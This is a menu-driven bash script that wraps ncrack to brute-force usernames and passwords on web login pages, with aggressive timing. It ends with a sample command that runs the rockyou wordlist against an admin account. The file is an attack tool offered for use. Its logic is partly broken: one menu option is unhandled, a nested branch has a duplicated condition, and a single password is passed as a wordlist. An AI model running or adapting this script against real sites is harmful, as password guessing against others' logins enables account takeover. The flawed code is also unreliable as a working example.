#!/bin/bash

printf '

__  __                  _        __ __
\ \/ /___ _____  ____  (_)____  / //_/
 \  / __ `/ __ \/ __ \/ / ___/ / ,<
 / / /_/ / / / / / / / (__  ) / /| |
/_/\__,_/_/ /_/_/ /_/_/____(_)_/ |_|

'

trap 'printf "\n";stop;exit 1' 2

menu() {

printf "    \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m bruteForce an account on a domain name (e.g : http://www.example.com) \e[0m    \n"
printf "    \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m bruteForce an account on sub-page (e.g : http://www.example.com/login.php) \e[0m   \n"
#printf "    \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Intrusion Global \e[0m \n"

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 ]]; then

	read -p $"Please enter the URL (e.g : http://www.example.com) : " url
	web=$(curl -s --head $url | head -n 1 | awk '{print$2}')

	if [[ ! "$web" =~ ^2 ]] && [ "$web" != "401" ] ;then
	echo ""
        echo "URL doesn't exist"

		echo ""
	        read -p $"Would you like to restart (y/n) ? " choice
        	if [[ "$choice" = "n" ]] || [[ "$choice" = "no" ]] ;then
		echo ""
		echo "Bye !"

		elif [[ "$choice" = "y" ]] || [[ "$choice" = "yes" ]] ;then
        	./bruteforceweb.sh
		fi

	else

		echo ""
		read -p $"Do you know the username (y/n) ? " choice
		if [[ "$choice" = "y" ]] || [[ "$choice" = "yes"  ]] ;then
		echo ""
		read -p $"Please enter the username : " username
		echo ""
		read -p  $"Do you know the password (y/n) ? " choice

			if [[ "$choice" = "y" ]] || [[ "$choice" = "yes"  ]] ;then
			echo ""
			read -p $"Please enter the password : " password
			ncrack -vv -T5 -f -u $username -P $password $url

			elif [[ "$choice" = "n" ]] || [[ "$choice" = "no"  ]] ;then
			echo ""
			read -p $"Please enter you're wordlist : " password
			ncrack -vv -T5 -f -u $username -P $password $url

			fi

		elif [[ "$choice" = "n" ]] || [[ "$choice" = "no"  ]] ;then
        		echo ""
	                read -p $"Do you have a wordlist's user (y/n) ? " choice

			if [[ "$choice" = "y" ]] || [[ "$choice" = "yes"  ]] ;then
          		echo ""
			read -p $"Please enter you're wordlist's username : " username
       	                echo ""
               	        read -p  $"Do you know the password (y/n) ? " choice

			elif [[ "$choice" = "y" ]] || [[ "$choice" = "yes"  ]] ;then
			echo ""
			read -p $"Please enter the password : " password
			ncrack -vv -T5 -f -u $username -P $password $url

			elif [[ "$choice" = "n" ]] || [[ "$choice" = "no"  ]] ;then
			echo ""
			read -p $"Please enter you're wordlist : " password
			ncrack -vv -T5 -f -u $username -P $password $url

			fi

		else
		echo ""
		echo "I can't do anything withouth a username ! "
		fi

	fi

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

menu

#ncrack -vv -T5 -f -u admin -P rockyou.txt http://www.example.com,path=top_secret/
